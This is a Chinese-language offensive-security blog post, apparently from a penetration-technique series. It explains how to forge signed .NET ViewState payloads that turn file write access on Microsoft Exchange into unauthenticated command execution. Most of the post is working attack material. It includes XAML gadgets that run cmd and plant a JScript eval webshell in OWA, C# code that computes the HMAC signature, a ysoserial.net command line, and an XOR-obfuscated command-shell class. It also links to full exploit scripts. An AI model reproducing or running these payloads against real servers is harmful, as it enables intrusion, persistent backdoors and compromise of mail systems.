@@ -1,0 +1,346 @@
+I"�><h2 id="0x00-前言">0x00 前言</h2>
+<hr />
+
+<p>在上篇文章《渗透技巧——从Exchange文件读写权限到命令执行》介绍了通过.Net反序列化ViewState从Exchange文件读写权限到命令执行的方法，分享了三种利用脚本的开发细节，本文将要具体分析生成ViewState的细节，介绍另外一种实现从Exchange文件读写权限到命令执行的脚本开发细节</p>
+
+<p>参考资料：</p>
+
+<p>http://www.zcgonvh.com/post/weaponizing_CVE-2020-0688_and_about_dotnet_deserialize_vulnerability.html
+https://github.com/pwntester/ysoserial.net</p>
+
+<h2 id="0x01-简介">0x01 简介</h2>
+<hr />
+
+<p>本文将要介绍以下内容：</p>
+
+<ul>
+  <li>两种生成ViewState的实现方法</li>
+  <li>另外一种利用脚本开发的细节</li>
+  <li>开源代码</li>
+</ul>
+
+<h2 id="0x02-背景知识">0x02 背景知识</h2>
+<hr />
+
+<h3 id="1dotnet反序列化viewstate的实现原理">1.DotNet反序列化ViewState的实现原理</h3>
+
+<p>如果能够读取web.config的文件内容，获得其中的加密密钥和算法，就能够构造出有效的序列化数据。如果将序列化数据设置成恶意委托，那么在ViewState使用ObjectStateFormatter进行反序列化调用委托时，就能实现远程代码执行。</p>
+
+<h3 id="2viewstate的生成流程">2.ViewState的生成流程</h3>
+
+<p>使用validationkey和generator作为参数，对序列化xaml数据进行签名，并放在序列化xaml数据后，作Base64编码后组成最终的ViewStaten内容</p>
+
+<p>直观理解：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>data = Serialize(xaml)
+ViewState = data + (data+generator).ComputeHash(validationKey)
+ViewState = Base64(ViewState)
+</code></pre></div></div>
+
+<p>加密细节可参考：</p>
+
+<p>https://github.com/pwntester/ysoserial.net/blob/master/ysoserial/Plugins/ViewStatePlugin.cs#L255</p>
+
+<p>https://github.com/0xacb/viewgen/blob/master/viewgen#L156</p>
+
+<p>具体细节可使用dnSpy反编译System.Web.dll，找到System.Web.Configuration.MachineKeySection的GetEncodedData函数</p>
+
+<h2 id="0x03-两种生成viewstate的实现方法">0x03 两种生成ViewState的实现方法</h2>
+<hr />
+
+<p>测试环境：</p>
+
+<p>获得了Exchange文件读写权限，能够修改<code class="language-plaintext highlighter-rouge">%ExchangeInstallPath%\FrontEnd\HttpProxy\owa\web.config</code>和<code class="language-plaintext highlighter-rouge">%ExchangeInstallPath%\FrontEnd\HttpProxy\ecp\web.config</code>，设置machineKey的内容如下：</p>
+
+<p><code class="language-plaintext highlighter-rouge">&lt;machineKey validationKey="CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF" decryptionKey="E9D2490BD0075B51D1BA5288514514AF" validation="SHA1" decryption="3DES" /&gt;</code></p>
+
+<p>对于这两个位置的.Net反序列化命令执行，不再需要合法用户的凭据</p>
+
+<p>下面介绍两种生成ViewState的程序实现方法</p>
+
+<h3 id="1从xaml数据生成viewstate">1.从xaml数据生成ViewState</h3>
+
+<p>流程如下：</p>
+
+<ol>
+  <li>构造xaml数据</li>
+  <li>生成序列化xaml数据</li>
+  <li>生成签名数据</li>
+  <li>拼接序列化xaml数据和签名数据后作Base64编码</li>
+</ol>
+
+<p>(1)构造xaml数据</p>
+
+<p>这里介绍4种，分别对应4个功能</p>
+
+<p>执行命令：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;ResourceDictionary xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" 
+    xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
+  xmlns:System="clr-namespace:System;assembly=mscorlib" 
+    xmlns:Diag="clr-namespace:System.Diagnostics;assembly=system"&gt;
+     &lt;ObjectDataProvider x:Key="" ObjectType="{x:Type Diag:Process}" MethodName="Start" &gt;
+     &lt;ObjectDataProvider.MethodParameters&gt;
+        &lt;System:String&gt;cmd&lt;/System:String&gt;
+        &lt;System:String&gt;"/c notepad"&lt;/System:String&gt;
+     &lt;/ObjectDataProvider.MethodParameters&gt;
+    &lt;/ObjectDataProvider&gt;
+&lt;/ResourceDictionary&gt;
+</code></pre></div></div>
+
+<p>写文件：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;ResourceDictionary xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
+    xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml" 
+    xmlns:s="clr-namespace:System;assembly=mscorlib"
+    xmlns:w="clr-namespace:System.Web;assembly=System.Web"&gt;
+  &lt;s:String x:Key="a" x:FactoryMethod="s:Environment.GetEnvironmentVariable" x:Arguments="ExchangeInstallPath"/&gt;
+  &lt;s:String x:Key="b" x:FactoryMethod="Concat"&gt;
+    &lt;x:Arguments&gt;
+      &lt;StaticResource ResourceKey="a"/&gt;
+      &lt;s:String&gt;FrontEnd\\HttpProxy\\owa\\auth\\xaml.aspx&lt;/s:String&gt;
+    &lt;/x:Arguments&gt;
+  &lt;/s:String&gt;
+  &lt;ObjectDataProvider x:Key="x" ObjectType="{x:Type s:IO.File}" MethodName="WriteAllText"&gt;
+    &lt;ObjectDataProvider.MethodParameters&gt;
+      &lt;StaticResource ResourceKey="b"/&gt;
+      &lt;s:String&gt;&amp;lt;%@ Page Language=&amp;quot;Jscript&amp;quot;%&amp;gt;&amp;lt;%eval(Request.Item[&amp;quot;pass&amp;quot;],&amp;quot;unsafe&amp;quot;);%&amp;gt;
+      &lt;/s:String&gt;
+    &lt;/ObjectDataProvider.MethodParameters&gt;
+  &lt;/ObjectDataProvider&gt;
+  &lt;ObjectDataProvider x:Key="c" ObjectInstance="{x:Static w:HttpContext.Current}" MethodName=""/&gt;
+  &lt;ObjectDataProvider x:Key="d" ObjectInstance="{StaticResource c}" MethodName="get_Response"/&gt;
+  &lt;ObjectDataProvider x:Key="e" ObjectInstance="{StaticResource d}" MethodName="End"/&gt;
+&lt;/ResourceDictionary&gt;
+</code></pre></div></div>
+
+<p><strong>注:</strong></p>
+
+<p>需要注意xaml的转义字符</p>
+
+<p>设置Header：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;ResourceDictionary xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" 
+    xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml" 
+    xmlns:s="clr-namespace:System;assembly=mscorlib" 
+    xmlns:w="clr-namespace:System.Web;assembly=System.Web"&gt;
+  &lt;ObjectDataProvider x:Key="a" ObjectInstance="{x:Static w:HttpContext.Current}" MethodName=""&gt;&lt;/ObjectDataProvider&gt;
+  &lt;ObjectDataProvider x:Key="b" ObjectInstance="{StaticResource a}" MethodName="get_Response"&gt;&lt;/ObjectDataProvider&gt;
+  &lt;ObjectDataProvider x:Key="c" ObjectInstance="{StaticResource b}" MethodName="get_Headers"&gt;&lt;/ObjectDataProvider&gt;
+  &lt;ObjectDataProvider x:Key="d" ObjectInstance="{StaticResource c}" MethodName="Add"&gt;
+    &lt;ObjectDataProvider.MethodParameters&gt;
+      &lt;s:String&gt;TEST-HEADER&lt;/s:String&gt;
+      &lt;s:String&gt;123456&lt;/s:String&gt;
+    &lt;/ObjectDataProvider.MethodParameters&gt;
+  &lt;/ObjectDataProvider&gt;
+  &lt;ObjectDataProvider x:Key="e" ObjectInstance="{StaticResource b}" MethodName="End"&gt;&lt;/ObjectDataProvider&gt;
+&lt;/ResourceDictionary&gt;
+</code></pre></div></div>
+
+<p>设置Response：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;ResourceDictionary xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" 
+    xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml" 
+    xmlns:s="clr-namespace:System;assembly=mscorlib" 
+    xmlns:w="clr-namespace:System.Web;assembly=System.Web"&gt;
+  &lt;ObjectDataProvider x:Key="a" ObjectInstance="{x:Static w:HttpContext.Current}" MethodName=""&gt;&lt;/ObjectDataProvider&gt;
+  &lt;ObjectDataProvider x:Key="b" ObjectInstance="{StaticResource a}" MethodName="get_Response"&gt;&lt;/ObjectDataProvider&gt;
+  &lt;ObjectDataProvider x:Key="c" ObjectInstance="{StaticResource b}" MethodName="Write"&gt;
+      &lt;ObjectDataProvider.MethodParameters&gt;
+      &lt;s:String&gt;123456&lt;/s:String&gt;
+    &lt;/ObjectDataProvider.MethodParameters&gt;
+  &lt;/ObjectDataProvider&gt;
+  &lt;ObjectDataProvider x:Key="e" ObjectInstance="{StaticResource b}" MethodName="End"&gt;&lt;/ObjectDataProvider&gt;
+&lt;/ResourceDictionary&gt;
+</code></pre></div></div>
+
+<p>(2)生成序列化xaml数据</p>
+
+<p>需要用到Microsoft.PowerShell.Editor.dll</p>
+
+<p>(3)生成签名数据</p>
+
+<p>参考代码：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>byte[] validationKey= strToToHexByte(key);
+uint _clientstateid = 0;
+// Converting "generator" from HEX to INT
+if(!uint.TryParse(generator, NumberStyles.HexNumber, CultureInfo.InvariantCulture, out _clientstateid))
+		System.Environment.Exit(0);
+byte[] _mackey = new byte[4];
+_mackey[0] = (byte)_clientstateid;
+_mackey[1] = (byte)(_clientstateid &gt;&gt; 8);
+_mackey[2] = (byte)(_clientstateid &gt;&gt; 16);
+_mackey[3] = (byte)(_clientstateid &gt;&gt; 24);
+ms = new MemoryStream();
+ms.Write(data,0,data.Length);
+ms.Write(_mackey,0,_mackey.Length);
+byte[] hash=(new HMACSHA1(validationKey)).ComputeHash(ms.ToArray());
+</code></pre></div></div>
+
+<p><strong>注：</strong></p>
+
+<p>代码修改自https://github.com/zcgonvh/CVE-2020-0688/blob/master/ExchangeCmd.cs#L253</p>
+
+<p>(4)拼接序列化xaml数据和签名数据后作Base64编码</p>
+
+<p>调用<code class="language-plaintext highlighter-rouge">Convert.ToBase64String()</code>即可</p>
+
+<p>完整的实现代码已上传至github，地址如下：</p>
+
+<p>https://github.com/3gstudent/Homework-of-C-Sharp/blob/master/XamlToViewState.cs</p>
+
+<p>代码能够读取xaml文件，使用validationkey和generator计算签名，生成最终的ViewState</p>
+
+<p>优点：</p>
+
+<p>流程清晰，便于调试和修改细节</p>
+
+<p>缺点：</p>
+
+<p>需要依赖中间文件Microsoft.PowerShell.Editor.dll，占用空间</p>
+
+<p><strong>注：</strong></p>
+
+<p>该方法的完整利用文件已打包上传至github，地址如下：</p>
+
+<p>https://github.com/3gstudent/test/blob/master/XamlToViewState.zip</p>
+
+<h3 id="2从序列化xaml数据生成viewstate">2.从序列化xaml数据生成ViewState</h3>
+
+<p>借助ysoserial.net跳过从xaml数据到序列化xaml数据的环节，提高开发效率</p>
+
+<p>流程如下：</p>
+
+<p>(1)修改ysoserial.net源码，直接读取可用的序列化xaml数据</p>
+
+<p>在https://github.com/pwntester/ysoserial.net/blob/master/ysoserial/Plugins/ViewStatePlugin.cs#L209添加如下代码：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Console.WriteLine(payloadString);
+Console.WriteLine("The content above is what we need");
+Console.WriteLine("-----------");
+</code></pre></div></div>
+
+<p>能够在控制台输出Base64编码的序列化xaml数据</p>
+
+<p>编译ysoserial.net，生成ysoserial.exe，在同级目录新建shellPayload.cs，内容如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>class E
+{
+    static string xor(string s) {
+        char[] a = s.ToCharArray();
+        for(int i = 0; i &lt; a.Length; i++)
+        a[i] = (char)(a[i] ^ 'x');
+        return new string(a);
+}
+    public E()
+    {
+        System.Web.HttpContext context = System.Web.HttpContext.Current;
+        context.Server.ClearError();
+        context.Response.Clear();
+        try
+        {
+            System.Diagnostics.Process process = new System.Diagnostics.Process();
+            process.StartInfo.FileName = "cmd.exe";
+            string cmd = context.Request.Form["__Value"];
+            cmd = xor(cmd);        
+            process.StartInfo.Arguments = "/c " + cmd;
+            process.StartInfo.RedirectStandardOutput = true;
+            process.StartInfo.RedirectStandardError = true;
+            process.StartInfo.UseShellExecute = false;
+            process.Start();
+            string output = process.StandardOutput.ReadToEnd();            
+            output = xor(output);
+            context.Response.Write(output);
+
+        } catch (System.Exception) { }
+        context.Response.Flush();
+        context.Response.End();
+    }
+}
+</code></pre></div></div>
+
+<p>使用ysoserial.exe生成ViewState，命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ysoserial.exe -p ViewState -g ActivitySurrogateSelectorFromFile -c "shellPayload.cs;System.Web.dll;System.dll;" --validationalg="SHA1" --validationkey="CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF" --generator="042A94E8"
+</code></pre></div></div>
+
+<p>从输出中获得Base64编码的序列化xaml数据</p>
+
+<p>(2)计算序列化xaml数据的签名，生成最终的ViewState数据</p>
+
+<p>代码如下:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>static string CreateViewState(byte[] dat,string generator,string key)
+{
+    MemoryStream ms = new MemoryStream();
+    byte[] validationKey= strToHexByte(key);
+
+    uint _clientstateid = 0;
+    if(!uint.TryParse(generator, NumberStyles.HexNumber, CultureInfo.InvariantCulture, out _clientstateid))
+    {
+        System.Environment.Exit(0);
+    }
+ 
+    byte[] _mackey = new byte[4];
+    _mackey[0] = (byte)_clientstateid;
+    _mackey[1] = (byte)(_clientstateid &gt;&gt; 8);
+    _mackey[2] = (byte)(_clientstateid &gt;&gt; 16);
+    _mackey[3] = (byte)(_clientstateid &gt;&gt; 24);
+
+    ms = new MemoryStream();
+    ms.Write(dat,0,dat.Length);
+    ms.Write(_mackey,0,_mackey.Length);
+    byte[] hash=(new HMACSHA1(validationKey)).ComputeHash(ms.ToArray());
+    ms=new MemoryStream();
+    ms.Write(dat,0,dat.Length);
+    ms.Write(hash,0,hash.Length);
+    return Convert.ToBase64String(ms.ToArray());
+}
+</code></pre></div></div>
+
+<p>完整的实现代码已上传至github，地址如下：</p>
+
+<p>https://github.com/3gstudent/Homework-of-C-Sharp/blob/master/SerializeXamlToViewState.cs</p>
+
+<p>代码实现了从序列化xaml数据计算签名，生成最终的ViewState数据</p>
+
+<p>优点：</p>
+
+<p>占用空间更小，可以直接使用ysoserial.net已有的Payload</p>
+
+<p>缺点：</p>
+
+<p>调试和修改比较麻烦</p>
+
+<p><strong>注：</strong></p>
+
+<p>以上两种实现方法的CreateViewState()函数在细节上存在区别，需要注意</p>
+
+<h2 id="0x04-另外一种利用脚本开发的细节">0x04 另外一种利用脚本开发的细节</h2>
+<hr />
+
+<p>用来实现从Exchange文件读写权限到命令执行</p>
+
+<p>参照 https://github.com/zcgonvh/CVE-2020-0688/blob/master/ExchangeCmd.cs 的结构，将序列化xaml数据封装在数组中，使用validationkey和generator作为参数，对序列化xaml数据进行签名，组成最终的ViewState内容</p>
+
+<p>完整的实现代码已上传至github，地址如下：</p>
+
+<p>https://github.com/3gstudent/Homework-of-C-Sharp/blob/master/SharpExchangeDeserializeShell-NoAuth-ActivitySurrogateSelectorFromFile.cs</p>
+
+<p>代码支持两个位置的反序列化执行，分别为默认存在的文件<code class="language-plaintext highlighter-rouge">%ExchangeInstallPath%\FrontEnd\HttpProxy\owa\auth\errorFE.aspx</code>和<code class="language-plaintext highlighter-rouge">%ExchangeInstallPath%\FrontEnd\HttpProxy\ecp\auth\TimeoutLogout.aspx</code></p>
+
+<p>代码首先发送<a href="https://github.com/pwntester/ysoserial.net">ysoserial.net</a>实现ActivitySurrogateDisableTypeCheck的数据，接着能够执行命令并获得命令执行的结果，通过POST方式以参数<code class="language-plaintext highlighter-rouge">__Value</code>发送数据，通信数据采用逐字符异或加密</p>
+
+<p>支持的功能同<a href="https://github.com/3gstudent/Homework-of-Python/blob/master/ExchangeDeserializeShell-NoAuth-ActivitySurrogateSelectorFromFile.py">ExchangeDeserializeShell-NoAuth-ActivitySurrogateSelectorFromFile.py</a>保持一致</p>
+
+<h2 id="0x05-小结">0x05 小结</h2>
+<hr />
+
+<p>本文分析了生成ViewState的细节，介绍了两种生成ViewState的程序实现方法，编写代码实现了另外一种从Exchange文件读写权限到命令执行的利用脚本</p>
+
+<hr />
+
+<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>
+
+:ET
